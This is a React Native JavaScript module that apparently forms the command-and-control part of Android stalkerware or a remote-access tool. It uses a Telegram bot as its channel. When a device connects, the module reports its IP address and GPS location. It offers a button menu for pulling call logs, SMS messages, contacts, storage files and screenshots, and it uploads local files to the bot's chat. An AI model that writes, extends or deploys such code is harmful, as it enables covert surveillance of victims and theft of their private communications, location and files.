/**
 * Telegram Bot API interface
 * Handles communication with the Telegram Bot API
 */
import axios from 'axios';
import { Platform } from 'react-native';
import logger from '../utils/logger';
import { encrypt } from '../utils/encryption';

// Create axios instance for Telegram API
const createTelegramAPI = (token) => {
  if (!token) {
    return null;
  }
  
  const api = axios.create({
    baseURL: `https://api.telegram.org/bot${token}`,
    timeout: 10000,
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': `TelegramMonitor/${Platform.OS}/${Platform.Version}`
    }
  });
  
  // Add response interceptor for error handling
  api.interceptors.response.use(
    response => response,
    error => {
      const errorMessage = error.response?.data?.description || error.message;
      logger.error(`Telegram API error: ${errorMessage}`);
      return Promise.reject(error);
    }
  );
  
  return api;
};

/**
 * Telegram API class
 */
class TelegramAPI {
  constructor() {
    this.api = null;
    this.token = null;
    this.chatId = null;
    this.lastUpdateId = 0;
    this.connected = false;
    this.connectionListeners = [];
    this.commandHandlers = {};
  }
  
  /**
   * Initialize the API with token and chat ID
   * @param {string} token - Telegram bot token
   * @param {string} chatId - Telegram chat ID
   */
  initialize(token, chatId) {
    this.token = token;
    this.chatId = chatId;
    this.api = createTelegramAPI(token);
    
    if (this.api && this.chatId) {
      this.setConnected(true);
    } else {
      this.setConnected(false);
    }
    
    return this.connected;
  }
  
  /**
   * Set connection status and notify listeners
   * @param {boolean} status - Connection status
   */
  setConnected(status) {
    this.connected = status;
    this.connectionListeners.forEach(listener => listener(status));
  }
  
  /**
   * Add connection status listener
   * @param {Function} listener - Listener function
   */
  addConnectionListener(listener) {
    if (typeof listener === 'function') {
      this.connectionListeners.push(listener);
    }
  }
  
  /**
   * Remove connection status listener
   * @param {Function} listener - Listener function to remove
   */
  removeConnectionListener(listener) {
    this.connectionListeners = this.connectionListeners.filter(l => l !== listener);
  }
  
  /**
   * Register a command handler
   * @param {string} command - Command name
   * @param {Function} handler - Handler function
   */
  registerCommandHandler(command, handler) {
    if (typeof handler === 'function') {
      this.commandHandlers[command] = handler;
    }
  }
  
  /**
   * Get updates from Telegram
   * @returns {Promise<Array>} Array of updates
   */
  async getUpdates() {
    if (!this.connected) {
      return [];
    }
    
    try {
      const response = await this.api.get('/getUpdates', {
        params: { 
          offset: this.lastUpdateId + 1,
          timeout: 1
        }
      });
      
      const updates = response.data.result || [];
      
      if (updates.length > 0) {
        this.lastUpdateId = updates[updates.length - 1].update_id;
      }
      
      return updates;
    } catch (error) {
      logger.error(`Failed to get updates: ${error.message}`);
      this.setConnected(false);
      return [];
    }
  }
  
  /**
   * Process a single update
   * @param {Object} update - Update object from Telegram
   */
  async processUpdate(update) {
    try {
      // Handle callback queries (button presses)
      if (update.callback_query) {
        const { id, data } = update.callback_query;
        
        // Answer the callback query to remove loading state
        await this.api.post('/answerCallbackQuery', { callback_query_id: id });
        
        // Find and execute the handler for this command
        if (this.commandHandlers[data]) {
          await this.commandHandlers[data](update.callback_query);
        } else if (data.includes('_')) {
          // Handle parameterized commands (e.g., file_123)
          const [command, ...params] = data.split('_');
          if (this.commandHandlers[command]) {
            await this.commandHandlers[command](update.callback_query, params.join('_'));
          }
        } else {
          logger.warning(`No handler for command: ${data}`);
        }
      }
      
      // Handle message commands
      if (update.message?.text && update.message.text.startsWith('/')) {
        const command = update.message.text.split(' ')[0].substring(1);
        if (this.commandHandlers[command]) {
          await this.commandHandlers[command](update.message);
        }
      }
    } catch (error) {
      logger.error(`Error processing update: ${error.message}`);
    }
  }
  
  /**
   * Send a message to the chat
   * @param {string} text - Message text
   * @param {Object} options - Additional options
   * @returns {Promise}
   */
  async sendMessage(text, options = {}) {
    if (!this.connected) {
      return false;
    }
    
    try {
      await this.api.post('/sendMessage', {
        chat_id: this.chatId,
        text,
        parse_mode: options.parse_mode || 'Markdown',
        reply_markup: options.reply_markup
      });
      return true;
    } catch (error) {
      logger.error(`Failed to send message: ${error.message}`);
      return false;
    }
  }
  
  /**
   * Send a file to the chat
   * @param {string} filePath - Local file path
   * @param {string} caption - File caption
   * @returns {Promise}
   */
  async sendFile(filePath, caption = '') {
    if (!this.connected) {
      return false;
    }
    
    try {
      const formData = new FormData();
      formData.append('chat_id', this.chatId);
      
      if (caption) {
        formData.append('caption', caption);
      }
      
      formData.append('document', {
        uri: filePath,
        name: filePath.split('/').pop(),
        type: 'application/octet-stream'
      });
      
      await this.api.post('/sendDocument', formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      });
      
      return true;
    } catch (error) {
      logger.error(`Failed to send file: ${error.message}`);
      return false;
    }
  }
  
  /**
   * Send device information
   * @param {Object} deviceInfo - Device information object
   * @returns {Promise}
   */
  async sendDeviceInfo(deviceInfo) {
    if (!this.connected || !deviceInfo) {
      return false;
    }
    
    try {
      const message = `📱 *Device Connected!*\n\n` +
        `• Device: ${deviceInfo.deviceName}\n` +
        `• Model: ${deviceInfo.model}\n` +
        `• OS: Android ${deviceInfo.osVersion}\n` +
        `• Build: ${deviceInfo.osBuild}\n` +
        `• IP: ${deviceInfo.ipAddress}\n` +
        `• Location: ${deviceInfo.location.latitude ? 
          `${deviceInfo.location.latitude.toFixed(4)}, ${deviceInfo.location.longitude.toFixed(4)}` : 'N/A'}\n` +
        `• Uptime: ${deviceInfo.uptime}\n` +
        `• App Version: ${deviceInfo.appVersion}\n` +
        `• Device ID: ${encrypt(deviceInfo.deviceId).substring(0, 16)}`;
      
      await this.sendMessage(message);
      
      // Send command menu
      const keyboard = {
        inline_keyboard: [
          [{ text: '📞 Call Logs', callback_data: 'call_logs' }, 
           { text: '💬 SMS Logs', callback_data: 'sms_logs' }],
          [{ text: '👥 Contacts', callback_data: 'contacts' }, 
           { text: '📁 Storage', callback_data: 'storage' }],
          [{ text: '📊 Device Info', callback_data: 'device_info' }, 
           { text: '📷 Take Screenshot', callback_data: 'screenshot' }]
        ]
      };
      
      await this.sendMessage('Choose an option:', { reply_markup: keyboard });
      return true;
    } catch (error) {
      logger.error(`Failed to send device info: ${error.message}`);
      return false;
    }
  }
}

// Create and export singleton instance
const telegramAPI = new TelegramAPI();
export default telegramAPI;
